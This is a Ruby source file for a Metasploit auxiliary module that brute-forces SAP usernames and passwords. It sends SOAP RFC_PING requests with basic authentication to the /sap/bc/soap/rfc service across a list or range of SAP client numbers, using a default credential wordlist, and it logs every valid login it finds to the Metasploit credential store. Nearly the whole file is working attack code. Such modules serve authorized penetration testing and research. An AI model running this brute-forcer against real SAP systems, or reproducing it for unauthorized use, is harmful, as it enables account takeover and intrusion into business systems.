##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name' => 'SAP SOAP Service RFC_PING Login Brute Forcer',
      'Description' => %q{
        This module attempts to brute force SAP username and passwords through the
        /sap/bc/soap/rfc SOAP service, using RFC_PING function.
      },
      'References' =>
        [
          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
        ],
      'Author' =>
        [
          'Agnivesh Sathasivam',
          'nmonkee'
        ],
      'License' => MSF_LICENSE
    )
    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('CLIENT', [true, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),
        OptString.new('TARGETURI', [true, 'The base path to the SOAP RFC Service', '/sap/bc/soap/rfc']),
        OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "sap_default.txt") ])
      ])

    deregister_options('HttpUsername', 'HttpPassword')
  end

  def run_host(rhost)
    client_list = []
    if datastore['CLIENT'] =~ /^\d{3},/
      client_list = datastore['CLIENT'].split(/,/)
      print_status("Brute forcing clients #{datastore['CLIENT']}")
    elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
      array = datastore['CLIENT'].split(/-/)
      client_list = (array.at(0)..array.at(1)).to_a
      print_status("Brute forcing clients #{datastore['CLIENT']}")
    elsif datastore['CLIENT'] =~ /^\d{3}\z/
      client_list.push(datastore['CLIENT'])
      print_status("Brute forcing client #{datastore['CLIENT']}")
    else
      fail_with(Failure::BadConfig, "Invalid CLIENT")
    end

    saptbl = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header' => "[SAP] #{peer} Credentials",
      'Prefix' => "\n",
      'Postfix' => "\n",
      'Indent'  => 1,
      'Columns' =>
        [
          "host",
          "port",
          "client",
          "user",
          "pass"
        ])

    client_list.each do |c|
      print_status("#{peer} [SAP] Trying client: #{c}")
      each_user_pass do |u, p|
        vprint_status("#{peer} [SAP] Trying #{c}:#{u}:#{p}")
        begin
          success = bruteforce(u, p, c)
          saptbl << [ rhost, rport, c, u, p] if success
        rescue ::Rex::ConnectionError
          print_error("#{peer} [SAP] Not responding")
          return
        end
      end
    end

    if saptbl.rows.count > 0
      print_line saptbl.to_s
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def bruteforce(username,password,client)
    uri = normalize_uri(target_uri.path)

    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    data << '<env:Body>'
    data << '<n1:RFC_PING xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '</n1:RFC_PING>'
    data << '</env:Body>'
    data << '</env:Envelope>'

    res = send_request_cgi({
      'uri' => uri,
      'method' => 'POST',
      'vars_get' => {
        'sap-client' => client,
        'sap-language' => 'EN'
      },
      'data' => data,
      'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{client}",
      'ctype' => 'text/xml; charset=UTF-8',
      'authorization' => basic_auth(username, password),
      'encode_params' => false,
      'headers' =>
        {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        }
    })

    if res && res.code == 200 && res.body.include?('RFC_PING')
      print_good("#{peer} [SAP] Client #{client}, valid credentials #{username}:#{password}")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'sap',
        user: username,
        password: password,
        proof: "SAP Client: #{client}"
      )
      return true
    end

    false
  end
end

